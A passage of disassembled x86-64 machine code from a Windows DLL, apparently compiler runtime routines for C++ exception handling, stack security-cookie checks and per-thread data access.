   18000376f:	48 8b 6c 24 70       	mov    0x70(%rsp),%rbp
   180003774:	41 8d 45 01          	lea    0x1(%r13),%eax
   180003778:	41 89 46 18          	mov    %eax,0x18(%r14)
   18000377c:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180003780:	41 89 46 1c          	mov    %eax,0x1c(%r14)
   180003784:	49 8b c6             	mov    %r14,%rax
   180003787:	41 89 5e 0c          	mov    %ebx,0xc(%r14)
   18000378b:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   180003790:	49 89 3e             	mov    %rdi,(%r14)
   180003793:	41 89 76 08          	mov    %esi,0x8(%r14)
   180003797:	49 89 7e 10          	mov    %rdi,0x10(%r14)
   18000379b:	48 83 c4 30          	add    $0x30,%rsp
   18000379f:	41 5e                	pop    %r14
   1800037a1:	41 5d                	pop    %r13
   1800037a3:	41 5c                	pop    %r12
   1800037a5:	5f                   	pop    %rdi
   1800037a6:	5e                   	pop    %rsi
   1800037a7:	c3                   	ret
   1800037a8:	cc                   	int3
   1800037a9:	cc                   	int3
   1800037aa:	cc                   	int3
   1800037ab:	cc                   	int3
   1800037ac:	cc                   	int3
   1800037ad:	cc                   	int3
   1800037ae:	cc                   	int3
   1800037af:	cc                   	int3
   1800037b0:	4c 8b dc             	mov    %rsp,%r11
   1800037b3:	48 81 ec e8 00 00 00 	sub    $0xe8,%rsp
   1800037ba:	48 8b 05 3f 98 01 00 	mov    0x1983f(%rip),%rax        # 0x18001d000
   1800037c1:	48 33 c4             	xor    %rsp,%rax
   1800037c4:	48 89 84 24 d0 00 00 	mov    %rax,0xd0(%rsp)
   1800037cb:	00 
   1800037cc:	4c 8b 94 24 38 01 00 	mov    0x138(%rsp),%r10
   1800037d3:	00 
   1800037d4:	48 8d 05 65 31 00 00 	lea    0x3165(%rip),%rax        # 0x180006940
   1800037db:	0f 28 05 9e ed 00 00 	movaps 0xed9e(%rip),%xmm0        # 0x180012580
   1800037e2:	0f 28 0d a7 ed 00 00 	movaps 0xeda7(%rip),%xmm1        # 0x180012590
   1800037e9:	48 8b 09             	mov    (%rcx),%rcx
   1800037ec:	0f 29 44 24 30       	movaps %xmm0,0x30(%rsp)
   1800037f1:	0f 28 05 a8 ed 00 00 	movaps 0xeda8(%rip),%xmm0        # 0x1800125a0
   1800037f8:	0f 29 44 24 50       	movaps %xmm0,0x50(%rsp)
   1800037fd:	0f 28 05 bc ed 00 00 	movaps 0xedbc(%rip),%xmm0        # 0x1800125c0
   180003804:	0f 29 4c 24 40       	movaps %xmm1,0x40(%rsp)
   180003809:	0f 28 0d a0 ed 00 00 	movaps 0xeda0(%rip),%xmm1        # 0x1800125b0
   180003810:	0f 29 4c 24 60       	movaps %xmm1,0x60(%rsp)
   180003815:	0f 28 0d b4 ed 00 00 	movaps 0xedb4(%rip),%xmm1        # 0x1800125d0
   18000381c:	0f 29 44 24 70       	movaps %xmm0,0x70(%rsp)
   180003821:	0f 28 05 b8 ed 00 00 	movaps 0xedb8(%rip),%xmm0        # 0x1800125e0
   180003828:	41 0f 29 4b 98       	movaps %xmm1,-0x68(%r11)
   18000382d:	0f 28 0d bc ed 00 00 	movaps 0xedbc(%rip),%xmm1        # 0x1800125f0
   180003834:	41 0f 29 43 a8       	movaps %xmm0,-0x58(%r11)
   180003839:	0f 28 05 c0 ed 00 00 	movaps 0xedc0(%rip),%xmm0        # 0x180012600
   180003840:	41 0f 29 4b b8       	movaps %xmm1,-0x48(%r11)
   180003845:	f2 0f 10 0d c3 ed 00 	movsd  0xedc3(%rip),%xmm1        # 0x180012610
   18000384c:	00 
   18000384d:	f2 41 0f 11 4b d8    	movsd  %xmm1,-0x28(%r11)
   180003853:	41 0f 29 43 c8       	movaps %xmm0,-0x38(%r11)
   180003858:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   18000385d:	48 8b 84 24 10 01 00 	mov    0x110(%rsp),%rax
   180003864:	00 
   180003865:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   18000386a:	48 63 84 24 20 01 00 	movslq 0x120(%rsp),%rax
   180003871:	00 
   180003872:	4c 89 4c 24 58       	mov    %r9,0x58(%rsp)
   180003877:	45 33 c9             	xor    %r9d,%r9d
   18000387a:	49 89 43 80          	mov    %rax,-0x80(%r11)
   18000387e:	48 8b 84 24 18 01 00 	mov    0x118(%rsp),%rax
   180003885:	00 
   180003886:	49 89 43 90          	mov    %rax,-0x70(%r11)
   18000388a:	0f b6 84 24 40 01 00 	movzbl 0x140(%rsp),%eax
   180003891:	00 
   180003892:	49 89 43 a0          	mov    %rax,-0x60(%r11)
   180003896:	49 8b 42 40          	mov    0x40(%r10),%rax
   18000389a:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   18000389f:	49 8b 42 28          	mov    0x28(%r10),%rax
   1800038a3:	4d 89 43 88          	mov    %r8,-0x78(%r11)
   1800038a7:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   1800038ac:	49 89 53 98          	mov    %rdx,-0x68(%r11)
   1800038b0:	49 8b 12             	mov    (%r10),%rdx
   1800038b3:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1800038b8:	49 c7 43 a8 20 05 93 	movq   $0x19930520,-0x58(%r11)
   1800038bf:	19 
   1800038c0:	ff 15 c2 e7 00 00    	call   *0xe7c2(%rip)        # 0x180012088
   1800038c6:	48 8b 8c 24 d0 00 00 	mov    0xd0(%rsp),%rcx
   1800038cd:	00 
   1800038ce:	48 33 cc             	xor    %rsp,%rcx
   1800038d1:	e8 5a e8 ff ff       	call   0x180002130
   1800038d6:	48 81 c4 e8 00 00 00 	add    $0xe8,%rsp
   1800038dd:	c3                   	ret
   1800038de:	cc                   	int3
   1800038df:	cc                   	int3
   1800038e0:	48 81 ec e8 00 00 00 	sub    $0xe8,%rsp
   1800038e7:	48 8b 05 12 97 01 00 	mov    0x19712(%rip),%rax        # 0x18001d000
   1800038ee:	48 33 c4             	xor    %rsp,%rax
   1800038f1:	48 89 84 24 d0 00 00 	mov    %rax,0xd0(%rsp)
   1800038f8:	00 
   1800038f9:	4c 8b 94 24 38 01 00 	mov    0x138(%rsp),%r10
   180003900:	00 
   180003901:	48 8d 05 48 32 00 00 	lea    0x3248(%rip),%rax        # 0x180006b50
   180003908:	0f 28 05 d1 eb 00 00 	movaps 0xebd1(%rip),%xmm0        # 0x1800124e0
   18000390f:	4c 8b d9             	mov    %rcx,%r11
   180003912:	0f 28 0d d7 eb 00 00 	movaps 0xebd7(%rip),%xmm1        # 0x1800124f0
   180003919:	0f 29 44 24 30       	movaps %xmm0,0x30(%rsp)
   18000391e:	0f 28 05 db eb 00 00 	movaps 0xebdb(%rip),%xmm0        # 0x180012500
   180003925:	0f 29 44 24 50       	movaps %xmm0,0x50(%rsp)
   18000392a:	0f 28 05 ef eb 00 00 	movaps 0xebef(%rip),%xmm0        # 0x180012520
   180003931:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   180003936:	48 8b 84 24 10 01 00 	mov    0x110(%rsp),%rax
   18000393d:	00 
   18000393e:	0f 29 4c 24 40       	movaps %xmm1,0x40(%rsp)
   180003943:	0f 28 0d c6 eb 00 00 	movaps 0xebc6(%rip),%xmm1        # 0x180012510
   18000394a:	0f 29 4c 24 60       	movaps %xmm1,0x60(%rsp)
   18000394f:	0f 28 0d da eb 00 00 	movaps 0xebda(%rip),%xmm1        # 0x180012530
   180003956:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   18000395b:	48 63 84 24 20 01 00 	movslq 0x120(%rsp),%rax
   180003962:	00 
   180003963:	0f 29 44 24 70       	movaps %xmm0,0x70(%rsp)
   180003968:	0f 28 05 d1 eb 00 00 	movaps 0xebd1(%rip),%xmm0        # 0x180012540
   18000396f:	4c 89 44 24 70       	mov    %r8,0x70(%rsp)
   180003974:	4c 8b 84 24 30 01 00 	mov    0x130(%rsp),%r8
   18000397b:	00 
   18000397c:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   180003981:	0f b6 84 24 40 01 00 	movzbl 0x140(%rsp),%eax
   180003988:	00 
   180003989:	0f 29 8c 24 80 00 00 	movaps %xmm1,0x80(%rsp)
   180003990:	00 
   180003991:	49 8b 48 18          	mov    0x18(%r8),%rcx
   180003995:	0f 28 0d b4 eb 00 00 	movaps 0xebb4(%rip),%xmm1        # 0x180012550
   18000399c:	4d 8b 40 20          	mov    0x20(%r8),%r8
   1800039a0:	49 03 4a 08          	add    0x8(%r10),%rcx
   1800039a4:	4d 03 42 08          	add    0x8(%r10),%r8
   1800039a8:	48 89 84 24 88 00 00 	mov    %rax,0x88(%rsp)
   1800039af:	00 
   1800039b0:	48 63 84 24 28 01 00 	movslq 0x128(%rsp),%rax
   1800039b7:	00 
   1800039b8:	0f 29 84 24 90 00 00 	movaps %xmm0,0x90(%rsp)
   1800039bf:	00 
   1800039c0:	0f 28 05 99 eb 00 00 	movaps 0xeb99(%rip),%xmm0        # 0x180012560
   1800039c7:	0f 29 8c 24 a0 00 00 	movaps %xmm1,0xa0(%rsp)
   1800039ce:	00 
   1800039cf:	f2 0f 10 0d 99 eb 00 	movsd  0xeb99(%rip),%xmm1        # 0x180012570
   1800039d6:	00 
   1800039d7:	48 89 84 24 a8 00 00 	mov    %rax,0xa8(%rsp)
   1800039de:	00 
   1800039df:	49 8b 42 40          	mov    0x40(%r10),%rax
   1800039e3:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1800039e8:	49 8b 42 28          	mov    0x28(%r10),%rax
   1800039ec:	4c 89 4c 24 58       	mov    %r9,0x58(%rsp)
   1800039f1:	45 33 c9             	xor    %r9d,%r9d
   1800039f4:	48 89 4c 24 78       	mov    %rcx,0x78(%rsp)
   1800039f9:	49 8b 0b             	mov    (%r11),%rcx
   1800039fc:	48 89 94 24 80 00 00 	mov    %rdx,0x80(%rsp)
   180003a03:	00 
   180003a04:	49 8b 12             	mov    (%r10),%rdx
   180003a07:	4c 89 84 24 98 00 00 	mov    %r8,0x98(%rsp)
   180003a0e:	00 
   180003a0f:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   180003a14:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180003a19:	0f 29 84 24 b0 00 00 	movaps %xmm0,0xb0(%rsp)
   180003a20:	00 
   180003a21:	f2 0f 11 8c 24 c0 00 	movsd  %xmm1,0xc0(%rsp)
   180003a28:	00 00 
   180003a2a:	48 c7 84 24 90 00 00 	movq   $0x19930520,0x90(%rsp)
   180003a31:	00 20 05 93 19 
   180003a36:	ff 15 4c e6 00 00    	call   *0xe64c(%rip)        # 0x180012088
   180003a3c:	48 8b 8c 24 d0 00 00 	mov    0xd0(%rsp),%rcx
   180003a43:	00 
   180003a44:	48 33 cc             	xor    %rsp,%rcx
   180003a47:	e8 e4 e6 ff ff       	call   0x180002130
   180003a4c:	48 81 c4 e8 00 00 00 	add    $0xe8,%rsp
   180003a53:	c3                   	ret
   180003a54:	cc                   	int3
   180003a55:	cc                   	int3
   180003a56:	cc                   	int3
   180003a57:	cc                   	int3
   180003a58:	cc                   	int3
   180003a59:	cc                   	int3
   180003a5a:	cc                   	int3
   180003a5b:	cc                   	int3
   180003a5c:	cc                   	int3
   180003a5d:	cc                   	int3
   180003a5e:	cc                   	int3
   180003a5f:	cc                   	int3
   180003a60:	40 53                	rex push %rbx
   180003a62:	56                   	push   %rsi
   180003a63:	57                   	push   %rdi
   180003a64:	4c 8b 49 10          	mov    0x10(%rcx),%r9
   180003a68:	48 8d 35 91 c5 ff ff 	lea    -0x3a6f(%rip),%rsi        # 0x180000000
   180003a6f:	8b 5a 08             	mov    0x8(%rdx),%ebx
   180003a72:	48 8b c1             	mov    %rcx,%rax
   180003a75:	4c 89 49 08          	mov    %r9,0x8(%rcx)
   180003a79:	33 ff                	xor    %edi,%edi
   180003a7b:	41 0f b6 09          	movzbl (%r9),%ecx
   180003a7f:	83 e1 0f             	and    $0xf,%ecx
   180003a82:	4c 0f be 84 31 c0 24 	movsbq 0x124c0(%rcx,%rsi,1),%r8
   180003a89:	01 00 
   180003a8b:	0f b6 8c 31 d0 24 01 	movzbl 0x124d0(%rcx,%rsi,1),%ecx
   180003a92:	00 
   180003a93:	4d 2b c8             	sub    %r8,%r9
   180003a96:	41 8b 51 fc          	mov    -0x4(%r9),%edx
   180003a9a:	d3 ea                	shr    %cl,%edx
   180003a9c:	89 50 18             	mov    %edx,0x18(%rax)
   180003a9f:	4c 89 48 08          	mov    %r9,0x8(%rax)
   180003aa3:	41 0f b6 09          	movzbl (%r9),%ecx
   180003aa7:	83 e1 0f             	and    $0xf,%ecx
   180003aaa:	48 0f be 94 31 c0 24 	movsbq 0x124c0(%rcx,%rsi,1),%rdx
   180003ab1:	01 00 
   180003ab3:	0f b6 8c 31 d0 24 01 	movzbl 0x124d0(%rcx,%rsi,1),%ecx
   180003aba:	00 
   180003abb:	4c 2b ca             	sub    %rdx,%r9
   180003abe:	41 8b 51 fc          	mov    -0x4(%r9),%edx
   180003ac2:	4c 89 48 08          	mov    %r9,0x8(%rax)
   180003ac6:	d3 ea                	shr    %cl,%edx
   180003ac8:	89 50 1c             	mov    %edx,0x1c(%rax)
   180003acb:	41 0f b6 09          	movzbl (%r9),%ecx
   180003acf:	83 e1 0f             	and    $0xf,%ecx
   180003ad2:	48 0f be 94 31 c0 24 	movsbq 0x124c0(%rcx,%rsi,1),%rdx
   180003ad9:	01 00 
   180003adb:	0f b6 8c 31 d0 24 01 	movzbl 0x124d0(%rcx,%rsi,1),%ecx
   180003ae2:	00 
   180003ae3:	4c 2b ca             	sub    %rdx,%r9
   180003ae6:	41 8b 51 fc          	mov    -0x4(%r9),%edx
   180003aea:	4d 8d 59 04          	lea    0x4(%r9),%r11
   180003aee:	4c 89 48 08          	mov    %r9,0x8(%rax)
   180003af2:	d3 ea                	shr    %cl,%edx
   180003af4:	89 50 20             	mov    %edx,0x20(%rax)
   180003af7:	41 8b 09             	mov    (%r9),%ecx
   180003afa:	4c 89 58 08          	mov    %r11,0x8(%rax)
   180003afe:	89 48 24             	mov    %ecx,0x24(%rax)
   180003b01:	85 db                	test   %ebx,%ebx
   180003b03:	0f 84 3b 01 00 00    	je     0x180003c44
   180003b09:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   180003b10:	41 0f b6 0b          	movzbl (%r11),%ecx
   180003b14:	4d 8b c3             	mov    %r11,%r8
   180003b17:	83 e1 0f             	and    $0xf,%ecx
   180003b1a:	ff c7                	inc    %edi
   180003b1c:	4c 0f be 94 31 c0 24 	movsbq 0x124c0(%rcx,%rsi,1),%r10
   180003b23:	01 00 
   180003b25:	0f b6 8c 31 d0 24 01 	movzbl 0x124d0(%rcx,%rsi,1),%ecx
   180003b2c:	00 
   180003b2d:	4d 2b c2             	sub    %r10,%r8
   180003b30:	41 8b 50 fc          	mov    -0x4(%r8),%edx
   180003b34:	4c 89 40 08          	mov    %r8,0x8(%rax)
   180003b38:	d3 ea                	shr    %cl,%edx
   180003b3a:	89 50 18             	mov    %edx,0x18(%rax)
   180003b3d:	41 0f b6 08          	movzbl (%r8),%ecx
   180003b41:	4d 8b c3             	mov    %r11,%r8
   180003b44:	83 e1 0f             	and    $0xf,%ecx
   180003b47:	4c 0f be 8c 31 c0 24 	movsbq 0x124c0(%rcx,%rsi,1),%r9
   180003b4e:	01 00 
   180003b50:	0f b6 8c 31 d0 24 01 	movzbl 0x124d0(%rcx,%rsi,1),%ecx
   180003b57:	00 
   180003b58:	4d 2b c1             	sub    %r9,%r8
   180003b5b:	4d 2b c2             	sub    %r10,%r8
   180003b5e:	41 8b 50 fc          	mov    -0x4(%r8),%edx
   180003b62:	4c 89 40 08          	mov    %r8,0x8(%rax)
   180003b66:	d3 ea                	shr    %cl,%edx
   180003b68:	89 50 1c             	mov    %edx,0x1c(%rax)
   180003b6b:	41 0f b6 08          	movzbl (%r8),%ecx
   180003b6f:	83 e1 0f             	and    $0xf,%ecx
   180003b72:	48 0f be 94 31 c0 24 	movsbq 0x124c0(%rcx,%rsi,1),%rdx
   180003b79:	01 00 
   180003b7b:	0f b6 8c 31 d0 24 01 	movzbl 0x124d0(%rcx,%rsi,1),%ecx
   180003b82:	00 
   180003b83:	4c 2b da             	sub    %rdx,%r11
   180003b86:	4d 2b d9             	sub    %r9,%r11
   180003b89:	4d 2b da             	sub    %r10,%r11
   180003b8c:	41 8b 53 fc          	mov    -0x4(%r11),%edx
   180003b90:	4c 89 58 08          	mov    %r11,0x8(%rax)
   180003b94:	d3 ea                	shr    %cl,%edx
   180003b96:	89 50 20             	mov    %edx,0x20(%rax)
   180003b99:	41 8b 0b             	mov    (%r11),%ecx
   180003b9c:	49 83 c3 04          	add    $0x4,%r11
   180003ba0:	4c 89 58 08          	mov    %r11,0x8(%rax)
   180003ba4:	4d 8b c3             	mov    %r11,%r8
   180003ba7:	89 48 24             	mov    %ecx,0x24(%rax)
   180003baa:	41 0f b6 0b          	movzbl (%r11),%ecx
   180003bae:	83 e1 0f             	and    $0xf,%ecx
   180003bb1:	4c 0f be 94 31 c0 24 	movsbq 0x124c0(%rcx,%rsi,1),%r10
   180003bb8:	01 00 
   180003bba:	0f b6 8c 31 d0 24 01 	movzbl 0x124d0(%rcx,%rsi,1),%ecx
   180003bc1:	00 
   180003bc2:	4d 2b c2             	sub    %r10,%r8
   180003bc5:	41 8b 50 fc          	mov    -0x4(%r8),%edx
   180003bc9:	4c 89 40 08          	mov    %r8,0x8(%rax)
   180003bcd:	d3 ea                	shr    %cl,%edx
   180003bcf:	89 50 18             	mov    %edx,0x18(%rax)
   180003bd2:	41 0f b6 08          	movzbl (%r8),%ecx
   180003bd6:	4d 8b c3             	mov    %r11,%r8
   180003bd9:	83 e1 0f             	and    $0xf,%ecx
   180003bdc:	4c 0f be 8c 31 c0 24 	movsbq 0x124c0(%rcx,%rsi,1),%r9
   180003be3:	01 00 
   180003be5:	0f b6 8c 31 d0 24 01 	movzbl 0x124d0(%rcx,%rsi,1),%ecx
   180003bec:	00 
   180003bed:	4d 2b c1             	sub    %r9,%r8
   180003bf0:	4d 2b c2             	sub    %r10,%r8
   180003bf3:	41 8b 50 fc          	mov    -0x4(%r8),%edx
   180003bf7:	d3 ea                	shr    %cl,%edx
   180003bf9:	4c 89 40 08          	mov    %r8,0x8(%rax)
   180003bfd:	89 50 1c             	mov    %edx,0x1c(%rax)
   180003c00:	41 0f b6 08          	movzbl (%r8),%ecx
   180003c04:	83 e1 0f             	and    $0xf,%ecx
   180003c07:	48 0f be 94 31 c0 24 	movsbq 0x124c0(%rcx,%rsi,1),%rdx
   180003c0e:	01 00 
   180003c10:	0f b6 8c 31 d0 24 01 	movzbl 0x124d0(%rcx,%rsi,1),%ecx
   180003c17:	00 
   180003c18:	4c 2b da             	sub    %rdx,%r11
   180003c1b:	4d 2b d9             	sub    %r9,%r11
   180003c1e:	4d 2b da             	sub    %r10,%r11
   180003c21:	41 8b 53 fc          	mov    -0x4(%r11),%edx
   180003c25:	d3 ea                	shr    %cl,%edx
   180003c27:	4c 89 58 08          	mov    %r11,0x8(%rax)
   180003c2b:	89 50 20             	mov    %edx,0x20(%rax)
   180003c2e:	41 8b 0b             	mov    (%r11),%ecx
   180003c31:	49 83 c3 04          	add    $0x4,%r11
   180003c35:	4c 89 58 08          	mov    %r11,0x8(%rax)
   180003c39:	89 48 24             	mov    %ecx,0x24(%rax)
   180003c3c:	3b fb                	cmp    %ebx,%edi
   180003c3e:	0f 85 cc fe ff ff    	jne    0x180003b10
   180003c44:	5f                   	pop    %rdi
   180003c45:	5e                   	pop    %rsi
   180003c46:	5b                   	pop    %rbx
   180003c47:	c3                   	ret
   180003c48:	cc                   	int3
   180003c49:	cc                   	int3
   180003c4a:	cc                   	int3
   180003c4b:	cc                   	int3
   180003c4c:	cc                   	int3
   180003c4d:	cc                   	int3
   180003c4e:	cc                   	int3
   180003c4f:	cc                   	int3
   180003c50:	40 53                	rex push %rbx
   180003c52:	48 83 ec 20          	sub    $0x20,%rsp
   180003c56:	48 8b d9             	mov    %rcx,%rbx
   180003c59:	48 89 11             	mov    %rdx,(%rcx)
   180003c5c:	e8 5f 07 00 00       	call   0x1800043c0
   180003c61:	48 3b 58 58          	cmp    0x58(%rax),%rbx
   180003c65:	73 0b                	jae    0x180003c72
   180003c67:	e8 54 07 00 00       	call   0x1800043c0
   180003c6c:	48 8b 48 58          	mov    0x58(%rax),%rcx
   180003c70:	eb 02                	jmp    0x180003c74
   180003c72:	33 c9                	xor    %ecx,%ecx
   180003c74:	48 89 4b 08          	mov    %rcx,0x8(%rbx)
   180003c78:	e8 43 07 00 00       	call   0x1800043c0
   180003c7d:	48 89 58 58          	mov    %rbx,0x58(%rax)
   180003c81:	48 8b c3             	mov    %rbx,%rax
   180003c84:	48 83 c4 20          	add    $0x20,%rsp
   180003c88:	5b                   	pop    %rbx
   180003c89:	c3                   	ret
   180003c8a:	cc                   	int3
   180003c8b:	cc                   	int3
   180003c8c:	cc                   	int3
   180003c8d:	cc                   	int3
   180003c8e:	cc                   	int3
   180003c8f:	cc                   	int3
   180003c90:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180003c95:	57                   	push   %rdi
   180003c96:	48 83 ec 20          	sub    $0x20,%rsp
   180003c9a:	48 8b f9             	mov    %rcx,%rdi
   180003c9d:	e8 1e 07 00 00       	call   0x1800043c0
   180003ca2:	48 3b 78 58          	cmp    0x58(%rax),%rdi
   180003ca6:	75 35                	jne    0x180003cdd
   180003ca8:	e8 13 07 00 00       	call   0x1800043c0
   180003cad:	48 8b 40 58          	mov    0x58(%rax),%rax
   180003cb1:	48 85 c0             	test   %rax,%rax
   180003cb4:	74 27                	je     0x180003cdd
   180003cb6:	48 8b 58 08          	mov    0x8(%rax),%rbx
   180003cba:	48 3b f8             	cmp    %rax,%rdi
   180003cbd:	74 0a                	je     0x180003cc9
   180003cbf:	48 8b c3             	mov    %rbx,%rax
   180003cc2:	48 85 db             	test   %rbx,%rbx
   180003cc5:	74 16                	je     0x180003cdd
   180003cc7:	eb ed                	jmp    0x180003cb6
   180003cc9:	e8 f2 06 00 00       	call   0x1800043c0
   180003cce:	48 89 58 58          	mov    %rbx,0x58(%rax)
   180003cd2:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180003cd7:	48 83 c4 20          	add    $0x20,%rsp
   180003cdb:	5f                   	pop    %rdi
   180003cdc:	c3                   	ret
   180003cdd:	e8 7e 53 00 00       	call   0x180009060
   180003ce2:	cc                   	int3
   180003ce3:	cc                   	int3
   180003ce4:	cc                   	int3
   180003ce5:	cc                   	int3
   180003ce6:	cc                   	int3
   180003ce7:	cc                   	int3
   180003ce8:	cc                   	int3
   180003ce9:	cc                   	int3
   180003cea:	cc                   	int3
   180003ceb:	cc                   	int3
   180003cec:	cc                   	int3
   180003ced:	cc                   	int3
   180003cee:	cc                   	int3
   180003cef:	cc                   	int3
   180003cf0:	48 83 ec 28          	sub    $0x28,%rsp
   180003cf4:	e8 c7 06 00 00       	call   0x1800043c0
   180003cf9:	48 8b 40 60          	mov    0x60(%rax),%rax
   180003cfd:	48 83 c4 28          	add    $0x28,%rsp
   180003d01:	c3                   	ret
   180003d02:	cc                   	int3
   180003d03:	cc                   	int3
   180003d04:	cc                   	int3
   180003d05:	cc                   	int3
   180003d06:	cc                   	int3
   180003d07:	cc                   	int3
   180003d08:	cc                   	int3
   180003d09:	cc                   	int3
   180003d0a:	cc                   	int3
   180003d0b:	cc                   	int3
   180003d0c:	cc                   	int3
   180003d0d:	cc                   	int3
   180003d0e:	cc                   	int3
   180003d0f:	cc                   	int3
   180003d10:	48 83 ec 28          	sub    $0x28,%rsp
   180003d14:	e8 a7 06 00 00       	call   0x1800043c0
   180003d19:	48 8b 40 68          	mov    0x68(%rax),%rax
   180003d1d:	48 83 c4 28          	add    $0x28,%rsp
   180003d21:	c3                   	ret
   180003d22:	cc                   	int3
   180003d23:	cc                   	int3
   180003d24:	cc                   	int3
   180003d25:	cc                   	int3
   180003d26:	cc                   	int3
   180003d27:	cc                   	int3
   180003d28:	cc                   	int3
   180003d29:	cc                   	int3
   180003d2a:	cc                   	int3
   180003d2b:	cc                   	int3
   180003d2c:	cc                   	int3
   180003d2d:	cc                   	int3
   180003d2e:	cc                   	int3
   180003d2f:	cc                   	int3
   180003d30:	40 53                	rex push %rbx
   180003d32:	48 83 ec 20          	sub    $0x20,%rsp
   180003d36:	48 8b d9             	mov    %rcx,%rbx
   180003d39:	e8 82 06 00 00       	call   0x1800043c0
   180003d3e:	48 89 58 60          	mov    %rbx,0x60(%rax)
   180003d42:	48 83 c4 20          	add    $0x20,%rsp
   180003d46:	5b                   	pop    %rbx
   180003d47:	c3                   	ret
   180003d48:	cc                   	int3
   180003d49:	cc                   	int3
   180003d4a:	cc                   	int3
   180003d4b:	cc                   	int3
   180003d4c:	cc                   	int3
   180003d4d:	cc                   	int3
   180003d4e:	cc                   	int3
   180003d4f:	cc                   	int3
   180003d50:	40 53                	rex push %rbx
   180003d52:	48 83 ec 20          	sub    $0x20,%rsp
   180003d56:	48 8b d9             	mov    %rcx,%rbx
   180003d59:	e8 62 06 00 00       	call   0x1800043c0
   180003d5e:	48 89 58 68          	mov    %rbx,0x68(%rax)
   180003d62:	48 83 c4 20          	add    $0x20,%rsp
   180003d66:	5b                   	pop    %rbx
   180003d67:	c3                   	ret
   180003d68:	cc                   	int3
   180003d69:	cc                   	int3
   180003d6a:	cc                   	int3
   180003d6b:	cc                   	int3
   180003d6c:	cc                   	int3
   180003d6d:	cc                   	int3
   180003d6e:	cc                   	int3
   180003d6f:	cc                   	int3
   180003d70:	40 53                	rex push %rbx
   180003d72:	55                   	push   %rbp
   180003d73:	56                   	push   %rsi
   180003d74:	57                   	push   %rdi
   180003d75:	48 83 ec 48          	sub    $0x48,%rsp
   180003d79:	49 8b 59 08          	mov    0x8(%r9),%rbx
   180003d7d:	49 8b f9             	mov    %r9,%rdi
   180003d80:	49 8b f0             	mov    %r8,%rsi
   180003d83:	48 89 54 24 70       	mov    %rdx,0x70(%rsp)
   180003d88:	48 8b e9             	mov    %rcx,%rbp
   180003d8b:	e8 30 06 00 00       	call   0x1800043c0
   180003d90:	48 89 58 60          	mov    %rbx,0x60(%rax)
   180003d94:	48 8b 5d 38          	mov    0x38(%rbp),%rbx
   180003d98:	e8 23 06 00 00       	call   0x1800043c0
   180003d9d:	48 89 58 68          	mov    %rbx,0x68(%rax)
   180003da1:	e8 1a 06 00 00       	call   0x1800043c0
   180003da6:	48 8b 57 38          	mov    0x38(%rdi),%rdx
   180003daa:	4c 8b cf             	mov    %rdi,%r9
   180003dad:	c6 44 24 38 00       	movb   $0x0,0x38(%rsp)
   180003db2:	4c 8b c6             	mov    %rsi,%r8
   180003db5:	8b 0a                	mov    (%rdx),%ecx
   180003db7:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   180003dbc:	48 03 48 60          	add    0x60(%rax),%rcx
   180003dc0:	33 c0                	xor    %eax,%eax
   180003dc2:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   180003dc7:	89 44 24 28          	mov    %eax,0x28(%rsp)
   180003dcb:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   180003dd0:	48 8b cd             	mov    %rbp,%rcx
   180003dd3:	e8 98 29 00 00       	call   0x180006770
   180003dd8:	48 83 c4 48          	add    $0x48,%rsp
   180003ddc:	5f                   	pop    %rdi
   180003ddd:	5e                   	pop    %rsi
   180003dde:	5d                   	pop    %rbp
   180003ddf:	5b                   	pop    %rbx
   180003de0:	c3                   	ret
   180003de1:	cc                   	int3
   180003de2:	cc                   	int3
   180003de3:	cc                   	int3
   180003de4:	cc                   	int3
   180003de5:	cc                   	int3
   180003de6:	cc                   	int3
   180003de7:	cc                   	int3
   180003de8:	cc                   	int3
   180003de9:	cc                   	int3
   180003dea:	cc                   	int3
   180003deb:	cc                   	int3
   180003dec:	cc                   	int3
   180003ded:	cc                   	int3
   180003dee:	cc                   	int3
   180003def:	cc                   	int3
   180003df0:	48 8b c4             	mov    %rsp,%rax
   180003df3:	48 89 58 10          	mov    %rbx,0x10(%rax)
   180003df7:	48 89 68 18          	mov    %rbp,0x18(%rax)
   180003dfb:	56                   	push   %rsi
   180003dfc:	57                   	push   %rdi
   180003dfd:	41 56                	push   %r14
   180003dff:	48 83 ec 60          	sub    $0x60,%rsp
   180003e03:	49 8b 59 08          	mov    0x8(%r9),%rbx
   180003e07:	45 33 f6             	xor    %r14d,%r14d
   180003e0a:	4c 89 70 cc          	mov    %r14,-0x34(%rax)
   180003e0e:	49 8b f9             	mov    %r9,%rdi
   180003e11:	4c 89 70 d4          	mov    %r14,-0x2c(%rax)
   180003e15:	49 8b f0             	mov    %r8,%rsi
   180003e18:	44 89 70 dc          	mov    %r14d,-0x24(%rax)
   180003e1c:	48 8b e9             	mov    %rcx,%rbp
   180003e1f:	c6 40 c8 00          	movb   $0x0,-0x38(%rax)
   180003e23:	48 89 50 08          	mov    %rdx,0x8(%rax)
   180003e27:	e8 94 05 00 00       	call   0x1800043c0
   180003e2c:	48 89 58 60          	mov    %rbx,0x60(%rax)
   180003e30:	48 8b 5d 38          	mov    0x38(%rbp),%rbx
   180003e34:	e8 87 05 00 00       	call   0x1800043c0
   180003e39:	48 89 58 68          	mov    %rbx,0x68(%rax)
   180003e3d:	e8 7e 05 00 00       	call   0x1800043c0
   180003e42:	48 8b 4f 38          	mov    0x38(%rdi),%rcx
   180003e46:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   180003e4b:	4c 8b 4f 10          	mov    0x10(%rdi),%r9
   180003e4f:	4c 8b 47 08          	mov    0x8(%rdi),%r8
